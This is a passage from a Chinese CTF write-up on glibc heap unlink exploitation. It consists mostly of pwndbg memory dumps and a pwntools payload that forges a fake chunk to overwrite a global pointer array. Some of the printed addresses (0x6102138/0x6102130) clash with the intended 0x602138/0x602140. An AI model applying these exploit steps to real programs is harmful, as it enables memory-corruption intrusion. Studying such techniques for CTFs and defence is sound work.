class="number">0</span>x7ffff7b04320 (__read_nocancel+<span class="number">7</span>) ◂— cmp    rax, <span class="literal">-0xfff</span></span><br><span class="line"> RDX  <span class="number">0</span>x400</span><br><span class="line"> RDI  <span class="number">0</span>x0</span><br><span class="line"> RSI  <span class="number">0</span>xe05010 ◂— <span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n&#x27;</span></span><br><span class="line"> R8   <span class="number">0</span>x7ffff7dd3780 (_IO_stdfile_1_lock) ◂— <span class="number">0</span>x0</span><br><span class="line"> R9   <span class="number">0</span>x7ffff7fde700 ◂— <span class="number">0</span>x7ffff7fde700</span><br><span class="line"> R10  <span class="number">0</span>x7ffff7fde700 ◂— <span class="number">0</span>x7ffff7fde700</span><br><span class="line"> R11  <span class="number">0</span>x246</span><br><span class="line"> R12  <span class="number">0</span>xa</span><br><span class="line"> R13  <span class="number">0</span>x9</span><br><span class="line">*R14  <span class="number">0</span>xe05041 ◂— <span class="number">0</span>x0</span><br><span class="line"> R15  <span class="number">0</span>x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— <span class="number">0</span>xfbad2288</span><br><span class="line"> <span class="built_in">RBP</span>  <span class="number">0</span>x7ffff7dd2620 (_IO_2_1_stdout_) ◂— <span class="number">0</span>xfbad2a84</span><br><span class="line"> RSP  <span class="number">0</span>x7fffffffe438 —▸ <span class="number">0</span>x7ffff7a875f8 (_IO_file_underflow+<span class="number">328</span>) ◂— cmp    rax, <span class="number">0</span></span><br><span class="line"> RIP  <span class="number">0</span>x7ffff7b04320 (__read_nocancel+<span class="number">7</span>) ◂— cmp    rax, <span class="literal">-0xfff</span></span><br><span class="line">───────────────────────────────────[ <span class="type">DISASM</span> ]───────────────────────────────────</span><br><span class="line"> ► <span class="number">0</span>x7ffff7b04320 &lt;__read_nocancel+<span class="number">7</span>&gt;     cmp    rax, <span class="literal">-0xfff</span></span><br><span class="line">   <span class="number">0</span>x7ffff7b04326 &lt;__read_nocancel+<span class="number">13</span>&gt;    jae    read+<span class="number">73</span> &lt;read+<span class="number">73</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0</span>x7ffff7b04359 &lt;read+<span class="number">73</span>&gt;               mov    rcx, qword ptr [<span class="type">rip</span> + <span class="number">0</span><span class="type">x2ccb18</span>]</span><br><span class="line">   <span class="number">0</span>x7ffff7b04360 &lt;read+<span class="number">80</span>&gt;               neg    eax</span><br><span class="line">   <span class="number">0</span>x7ffff7b04362 &lt;read+<span class="number">82</span>&gt;               mov    dword ptr fs:[<span class="type">rcx</span>], eax</span><br><span class="line">   <span class="number">0</span>x7ffff7b04365 &lt;read+<span class="number">85</span>&gt;               or     rax, <span class="number">0</span>xffffffffffffffff</span><br><span class="line">   <span class="number">0</span>x7ffff7b04369 &lt;read+<span class="number">89</span>&gt;               ret</span><br><span class="line"></span><br><span class="line">   <span class="number">0</span>x7ffff7b0436a                         nop    word ptr [<span class="type">rax</span> + <span class="type">rax</span>]</span><br><span class="line">   <span class="number">0</span>x7ffff7b04370 &lt;<span class="built_in">write</span>&gt;                 cmp    dword ptr [<span class="type">rip</span> + <span class="number">0</span><span class="type">x2d23c9</span>], <span class="number">0</span> &lt;<span class="number">0</span>x7ffff7dd6740&gt;</span><br><span class="line">   <span class="number">0</span>x7ffff7b04377 &lt;<span class="built_in">write</span>+<span class="number">7</span>&gt;               jne    <span class="built_in">write</span>+<span class="number">25</span> &lt;<span class="built_in">write</span>+<span class="number">25</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0</span>x7ffff7b04389 &lt;<span class="built_in">write</span>+<span class="number">25</span>&gt;              sub    rsp, <span class="number">8</span></span><br><span class="line">───────────────────────────────────[ <span class="type">STACK</span> ]────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0</span>x7fffffffe438 —▸ <span class="number">0</span>x7ffff7a875f8 (_IO_file_underflow+<span class="number">328</span>) ◂— cmp    rax, <span class="number">0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0</span>x7fffffffe440 ◂— <span class="number">0</span>x0</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0</span>x7fffffffe448 —▸ <span class="number">0</span>x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— <span class="number">0</span>xfbad2288</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0</span>x7fffffffe450 —▸ <span class="number">0</span>x7fffffffe500 ◂— <span class="number">0</span>xa616161616161 /* <span class="string">&#x27;aaaaaa\n&#x27;</span> */</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0</span>x7fffffffe458 —▸ <span class="number">0</span>x7ffff7a8861e (_IO_default_uflow+<span class="number">14</span>) ◂— cmp    eax, <span class="literal">-1</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0</span>x7fffffffe460 ◂— <span class="number">0</span>x0</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0</span>x7fffffffe468 —▸ <span class="number">0</span>x7ffff7a7bc7a (_IO_getline_info+<span class="number">170</span>) ◂— cmp    eax, <span class="literal">-1</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0</span>x7fffffffe470 ◂— <span class="number">0</span>x0</span><br><span class="line">─────────────────────────────────[ <span class="type">BACKTRACE</span> ]──────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">7</span>ffff7b04320 __read_nocancel+<span class="number">7</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7</span>ffff7a875f8 _IO_file_underflow+<span class="number">328</span></span><br><span class="line">   f <span class="number">2</span>     <span class="number">7</span>ffff7a8861e _IO_default_uflow+<span class="number">14</span></span><br><span class="line">   f <span class="number">3</span>     <span class="number">7</span>ffff7a7bc7a _IO_getline_info+<span class="number">170</span></span><br><span class="line">   f <span class="number">4</span>     <span class="number">7</span>ffff7a7bd88</span><br><span class="line">   f <span class="number">5</span>     <span class="number">7</span>ffff7a7ab8d fgets+<span class="number">173</span></span><br><span class="line">   f <span class="number">6</span>           <span class="number">400</span>d2e</span><br><span class="line">   f <span class="number">7</span>     <span class="number">7</span>ffff7a2d840 __libc_start_main+<span class="number">240</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>再次查看堆的状态：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">1000</span>gx <span class="number">0</span>xe05000</span><br><span class="line"><span class="number">0</span>xe05000:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000411  <span class="comment">#buffer_zone1(缓冲区1)</span></span><br><span class="line"><span class="number">0</span>xe05010:	<span class="number">0</span>x6161616161616161	<span class="number">0</span>x6161616161616161</span><br><span class="line"><span class="number">0</span>xe05020:	<span class="number">0</span>x6161616161616161	<span class="number">0</span>x6161616161616161</span><br><span class="line"><span class="number">0</span>xe05030:	<span class="number">0</span>x6161616161616161	<span class="number">0</span>x6161616161616161</span><br><span class="line"><span class="number">0</span>xe05040:	<span class="number">0</span>x000000000000000a	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>xe05050:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>xe05060:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line">...（省略内容均为空）</span><br><span class="line"><span class="number">0</span>xe05400:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>xe05410:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000111  <span class="comment">#chunk1：malloc(0x100)</span></span><br><span class="line"><span class="number">0</span>xe05420:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>xe05430:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line">...（省略内容均为空）</span><br><span class="line"><span class="number">0</span>xe05510:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>xe05520:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000411  <span class="comment">#buffer_zone2(缓冲区2)</span></span><br><span class="line"><span class="number">0</span>xe05530:	<span class="number">0</span>x0000000a4c494146	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>xe05540:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line">...（省略内容均为空）</span><br><span class="line"><span class="number">0</span>xe05920:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>xe05930:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000041  <span class="comment">#chunk2：malloc(0x30)</span></span><br><span class="line"><span class="number">0</span>xe05940:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>xe05950:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>xe05960:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>xe05970:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000091  <span class="comment">#chunk3：malloc(0x80)</span></span><br><span class="line"><span class="number">0</span>xe05980:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>xe05990:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>xe059a0:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>xe059b0:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line">...（省略内容均为空）</span><br><span class="line"><span class="number">0</span>xe059f0:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>xe05a00:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000020601  <span class="comment">#top_chunk</span></span><br><span class="line"><span class="number">0</span>xe05a10:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>xe05a20:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line">...（省略内容均为空）</span><br><span class="line"><span class="number">0</span>xe06f30:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>因此，当 payload 执行的时候，会写入到 buffer_zone1(缓冲区 1)中，payload 执行之后会出现如下情况：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">1000</span>gx <span class="number">0</span>xe05000</span><br><span class="line"><span class="number">0</span>xe05000:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000411  <span class="comment">#buffer_zone1(缓冲区1)</span></span><br><span class="line"><span class="number">0</span>xe05010:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000030</span><br><span class="line"><span class="number">0</span>xe05020:	<span class="number">0</span>x0000000006102138	<span class="number">0</span>x0000000006102130</span><br><span class="line"><span class="number">0</span>xe05030:	<span class="number">0</span>x6161616161616161	<span class="number">0</span>x6161616161616161</span><br><span class="line"><span class="number">0</span>xe05040:	<span class="number">0</span>x0000000000000030	<span class="number">0</span>x0000000000000090</span><br><span class="line"><span class="number">0</span>xe05050:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>xe05060:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = p64(0) + p64(0x30) + p64(0x602140 + 16 - 0x18) + p64(0x602140 + 16 - 0x10) + &#x27;a&#x27; * 0x10 + p64(0x30) + p64(0x90)</span></span><br><span class="line"><span class="comment">#edit(2, len(payload), payload)</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>看一下上面的代码框，payload 虽然在“表面上”写入了缓冲区 1 中，但最后是会写入到 chunk2 中，以下的表述均以缓冲区 1 来体现。（注：不同的 Linux 版本、不同的 libc 文件可能对堆（缓冲区、malloc_chunk）的管理方式不同）</p>
</blockquote>
<p>将他看作为一个 chunk：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">1000</span>gx <span class="number">0</span>xe05000</span><br><span class="line"><span class="number">0</span>xe05000:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000411  <span class="comment">#buffer_zone1(缓冲区1)</span></span><br><span class="line"><span class="comment">#buffer_zone1_data_start</span></span><br><span class="line"><span class="number">0</span>xe05010:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000030  <span class="comment">#fake_prev_size;fake_size</span></span><br><span class="line"><span class="number">0</span>xe05020:	<span class="number">0</span>x0000000006102138	<span class="number">0</span>x0000000006102140  <span class="comment">#fake_fd;fake_bk</span></span><br><span class="line"><span class="number">0</span>xe05030:	<span class="number">0</span>x6161616161616161	<span class="number">0</span>x6161616161616161  <span class="comment">#fake_fd_nextsize;fake_bk_nextsize</span></span><br><span class="line"><span class="number">0</span>xe05040:	<span class="number">0</span>x0000000000000030	<span class="number">0</span>x0000000000000090  <span class="comment">#next_chunk_prev_size;next_chunk_size</span></span><br><span class="line"><span class="number">0</span>xe05050:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>xe05060:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000，</span><br><span class="line"><span class="comment">#payload = p64(0) + p64(0x30) + p64(0x602140 + 16 - 0x18) + p64(0x602140 + 16 - 0x10) + &#x27;a&#x27; * 0x10 + p64(0x30) + p64(0x90)</span></span><br><span class="line"><span class="comment">#edit(2, len(payload), payload)</span></span><br></pre></td></tr></table></figure>

<p>解释一下这个代码框中出现的内容：</p>
<ul>
<li>p(64)：我们只想在释放相邻内存堆块的时候向前合并 fake_chunk，并且不需要合并某一内存堆块，所以将 fake_chunk 的 prev_size 置 0 就行。</li>
<li>p64(0x30)：fake_chunk 仅仅需要 fd 和 bk 就可以完成 unlink 的流程，后面的 next_prev 和 next_size 仅仅为了检查时候的使用，所以将 size 的大小等于 0x30 就行</li>
<li>next_chunk_prev_size：这里其实就是为了绕过检查，证明 fake_chunk 是一个空闲块，所以 next_prev 要等于 size，即 0x30</li>
<li>next__chunk_size：随便设置一个数字，使二进制最低标志位 P 为 0 即可</li>
</ul>
<p>但是为什么要将 fake_chunk 的 fd 和 bk 设置成 0x6102138 和 0x6102140 呢？<br>从前面的静态分析可以知道存放堆地址指针地址为：0x6102140，具体内容如下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">16</span>gx <span class="number">0</span>x602140</span><br><span class="line"><span class="number">0</span>x602140:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000e05420 <span class="comment">#chunk1_data_ptr</span></span><br><span class="line"><span class="number">0</span>x602150:	<span class="number">0</span>x0000000000e05940	<span class="number">0</span>x0000000000e05980 <span class="comment">#chunk2_data_ptr and chunk3_data_ptr</span></span><br><span class="line"><span class="number">0</span>x602160:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x602170:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x602180:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x602190:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x6021a0:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x6021b0:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>若将上面的内容当作一个堆块呢，我们将其命名为 third_chunk</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">16</span>gx <span class="number">0</span>x602140</span><br><span class="line"><span class="number">0</span>x602140:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000e05420</span><br><span class="line">          <span class="comment">#prev_size          #size</span></span><br><span class="line"><span class="number">0</span>x602150:	<span class="number">0</span>x0000000000e05940	<span class="number">0</span>x0000000000e05980</span><br><span class="line">          <span class="comment">#fd                 #bk</span></span><br><span class="line"><span class="number">0</span>x602160:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x602170:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x602180:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x602190:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x6021a0:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x6021b0:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>同样的思路，将 0x602140 - 0x8 的位置也看做是一个 chunk，那么这个 chunk 的 bk 就是 0x602140，所以这个 chunk 可以作为 first_chunk</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">16</span>gx <span class="number">0</span>x602138</span><br><span class="line"><span class="number">0</span>x602138:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line">          <span class="comment">#prev_size          #size</span></span><br><span class="line"><span class="number">0</span>x602148:	<span class="number">0</span>x0000000000e05420	<span class="number">0</span>x0000000000e05940</span><br><span class="line">          <span class="comment">#fd                 #bk</span></span><br><span class="line"><span class="number">0</span>x602158:	<span class="number">0</span>x0000000000e05980	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x602168:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x602178:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x602188:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x602198:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="number">0</span>x6021a8:	<span class="number">0</span>x0000000000000000	<span class="number">0</span>x0000000000000000</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>大致的图解如下：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1601110960158-631346e5-f615-4055-8b73-ac600b71ba76.png#align=left&display=inline&height=372&margin=%5Bobject%20Object%5D&name=20200916165646634.png&originHeight=372&originWidth=1754&size=70377&status=done&style=none&width=1754" alt="20200916165646634.png"><br>这样一来，伪造的 fake_chunk 就准备齐全了：</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1601117139375-1280ad65-d3a3-44b9-a4c0-f0c2b7aac12e.png#align=left&display=inline&height=670&margin=%5Bobject%20Object%5D&name=20200916165939607.png&originHeight=670&originWidth=2192&size=118069&status=done&style=none&width=2192" alt="20200916165939607.png"></h2><blockquote>
<p>上图中 fd_nextsize 和 bk_nextsize 的内容分别为：0x6161616161616161，0x6161616161616161<br>再次说明，payload 实际上是写入了 chunk2 中，将 chunk3 的 prev_size 和 size 字段进行覆盖修改。</p>
</blockquote>
<h2 id="4、free-amp-chunk3-触发-unlink"><a href="#4、free-amp-chunk3-触发-unlink" class="headerlink" title="4、free(&amp;chunk3)触发 unlink"></a>4、free(&amp;chunk3)触发 unlink</h2><p>unlink 原理：&gt;</p>
<blockquote>
<p>当我们 free 一块内存时，系统会自动判定 待 free 堆块的前一个堆块和后一个堆块是否也处于 free 状态，如果是，那么系统会先将那个堆块从链表中卸下，并与待 free 堆块合并之后重新插入相应的链表，这样可以降低堆的碎片化程度，提高系统执行效率。而其中将某个堆块卸下的过程，就称为 unlink 。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">log.info(<span class="string">&quot;Now we have fake chunks, just free chunk3 to change global pointer...&quot;</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line"><span class="comment">#gdb,attach(p)</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.success(<span class="string">&quot;Global pointer has been changed!&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>为什么释放 chunk3 就会触发 unlink？</p>
<blockquote>
<p>在此之前，我们伪造出的 fake_chunk 是用双向链表与 first_chunk 和 third_chunk 相连的，记住这一点。</p>
</blockquote>
<p>由于 fake_chunk 和 chunk3 相邻，而伪造出的 fake_chunk 是空闲状态，因此 chunk3 释放时要与 fake_chunk 合并成一个空闲的大 chunk。系统会先将 fake_chunk 从 third_chunk 和 first_chunk 的双向链表中“卸下”，图解如下：<br>摘除之前：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1601194582198-3bd1d02a-cc0e-42a8-8d06-b5da8ab0ffb0.png#align=left&display=inline&height=682&margin=%5Bobject%20Object%5D&name=20200917141220517.png&originHeight=682&originWidth=1466&size=208060&status=done&style=none&width=1466" alt="20200917141220517.png"><br>摘除之后：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1601199961218-504d9647-48f9-4f90-8f1a-d8c6f1e89e17.png#align=left&display=inline&height=452&margin=%5Bobject%20Object%5D&originHeight=452&originWidth=1460&size=0&status=done&style=none&width=1460"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#摘除之前</span></span><br><span class="line">pwndbg&gt; x/16gx <span class="number">0x602138</span></span><br><span class="line"><span class="number">0x602138</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602148</span>:	<span class="number">0x0000000000e05420</span>	<span class="number">0x0000000000e05940</span></span><br><span class="line"><span class="number">0x602158</span>:	<span class="number">0x0000000000e05980</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602168</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602178</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602188</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602198</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6021a8</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>① fake_chunk 被摘除时首先执行：first_bk = third_addr，也就是说 first_chunk 的 bk 由原来指向 fake_chunk 地址更改成指向 third_chunk 地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#摘除第一步完成，first_chunk</span></span><br><span class="line">pwndbg&gt; x/16gx <span class="number">0x602138</span></span><br><span class="line"><span class="number">0x602138</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602148</span>:	<span class="number">0x0000000000e05420</span>	<span class="number">0x0000000000602140</span></span><br><span class="line">            <span class="comment">#fd                 #bk</span></span><br><span class="line"><span class="number">0x602158</span>:	<span class="number">0x0000000000e05980</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602168</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602178</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602188</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602198</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6021a8</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>② 接下来执行<code>third_fd = first_addr</code>，即 third_chunk 的 fd 由由原来指向 fake_chunk 地址更改成 first_chunk 地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#摘除第二步完成，third_chunk</span></span><br><span class="line">pwndbg&gt; x/16gx <span class="number">0x602140</span></span><br><span class="line"><span class="number">0x602140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000e05420</span></span><br><span class="line"><span class="number">0x602150</span>:	<span class="number">0x0000000000602138</span>	<span class="number">0x0000000000e05980</span></span><br><span class="line">            <span class="comment">#fd                 #bk</span></span><br><span class="line"><span class="number">0x602160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602170</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602180</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602190</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6021a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6021b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

